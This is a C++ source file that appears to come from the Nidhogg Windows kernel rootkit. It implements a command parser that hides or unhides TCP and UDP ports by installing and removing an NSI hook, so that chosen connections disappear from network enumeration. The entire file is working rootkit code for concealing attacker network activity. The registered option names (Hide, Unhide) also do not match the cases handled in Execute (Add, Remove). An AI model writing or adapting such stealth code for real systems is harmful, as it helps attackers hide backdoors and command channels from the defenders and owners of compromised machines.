#include "pch.h"
#include "NetworkParser.h"
#include "NetworkUtils.hpp"

NetworkParser::NetworkParser() {
	this->optionsSize = 3;
	this->options = (OptionMetadata*)AllocateMemory(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	ArgType defaultTypes[3] = { ArgType::ULong, ArgType::ULong, ArgType::ULong };

	this->options[0] = { Options::Clear, {} };
	this->options[1] = { Options::Hide, { 3, { ArgType::ULong, ArgType::ULong,
		ArgType::ULong } } };
	this->options[2] = { Options::Unhide, { 3, { ArgType::ULong, ArgType::ULong,
		ArgType::ULong } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS NetworkParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	NTSTATUS status = STATUS_SUCCESS;
	HiddenPort hiddenPort{};

	if (commandId != Options::Clear) {
		hiddenPort.Port = *(USHORT*)args[0];
		hiddenPort.Type = *(PortType*)args[2];

		if (hiddenPort.Port == 0 || (hiddenPort.Type != PortType::TCP && hiddenPort.Type != PortType::UDP) ||
			*(ULONG*)args[1] > 1)
			return STATUS_INVALID_PARAMETER;

		hiddenPort.Remote = *(bool*)args[1];
	}

	switch (commandId) {
	case Options::Add:
	{
		if (NidhoggNetworkUtils->GetPortsCount() == MAX_PORTS) {
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
			if (!NidhoggNetworkUtils->AddHiddenPort(hiddenPort)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			if (!NidhoggNetworkUtils->IsCallbackActivated()) {
				status = NidhoggNetworkUtils->InstallNsiHook();

				if (!NT_SUCCESS(status)) {
					NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort);
					break;
				}
			}
		}
		break;
	}
	case Options::Remove:
	{
		if (NidhoggNetworkUtils->GetPortsCount() == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (NidhoggNetworkUtils->GetPortsCount() == 0)
			status = NidhoggNetworkUtils->UninstallNsiHook();
		break;
	}
	case Options::Clear:
	{
		NidhoggNetworkUtils->ClearHiddenPortsList();
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	return status;
}
